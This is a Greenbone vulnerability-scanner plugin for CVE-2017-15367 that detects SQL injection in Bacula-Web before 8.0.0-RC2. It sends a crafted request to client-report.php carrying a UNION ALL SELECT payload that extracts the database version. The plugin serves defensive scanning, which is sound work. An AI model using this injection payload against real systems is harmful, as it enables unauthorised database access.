# SPDX-FileCopyrightText: 2018 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:bacula-web:bacula-web";

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.140946");
  script_version("2023-07-20T05:05:17+0000");
  script_tag(name:"last_modification", value:"2023-07-20 05:05:17 +0000 (Thu, 20 Jul 2023)");
  script_tag(name:"creation_date", value:"2018-04-04 13:05:03 +0700 (Wed, 04 Apr 2018)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"severity_vector", value:"CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H");
  script_tag(name:"severity_origin", value:"NVD");
  script_tag(name:"severity_date", value:"2018-10-09 15:07:00 +0000 (Tue, 09 Oct 2018)");

  script_cve_id("CVE-2017-15367");

  script_tag(name:"qod_type", value:"remote_vul");

  script_tag(name:"solution_type", value:"VendorFix");

  script_name("Bacula-Web < 8.0.0-RC2 SQL Injection Vulnerability");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2018 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("gb_bacula_web_detect.nasl");
  script_mandatory_keys("bacula-web/installed");

  script_tag(name:"summary", value:"Bacula-web before 8.0.0-rc2 is affected by multiple SQL Injection
vulnerabilities that could allow an attacker to access the Bacula database and, depending on configuration,
escalate privileges on the server.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the response.");

  script_tag(name:"affected", value:"Bacula-Web versions prior 8.0.0-rc2.");

  script_tag(name:"solution", value:"Update to version 8.0.0-rc2 or later.");

  script_xref(name:"URL", value:"http://bugs.bacula-web.org/view.php?id=211");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");

if (!port = get_app_port(cpe: CPE))
  exit(0);

if (!dir = get_app_location(cpe: CPE, port: port))
  exit(0);

if (dir == "/")
  dir = "";

url = dir + '/client-report.php?period=7&client_id=21%20UNION%20ALL%20SELECT%20NULL,@@version%23';

req = http_get(port: port, item: url);
res = http_keepalive_send_recv(port: port, data: req);

version = eregmatch(pattern: '</dt> <dd>([^<]+)', string: res);
if (!isnull(version[1])) {
  report = 'It was possible to get the database version through an SQL injection.\n\nResult:\n' + version[1];
  security_message(port: port, data: report);
  exit(0);
}

exit(99);
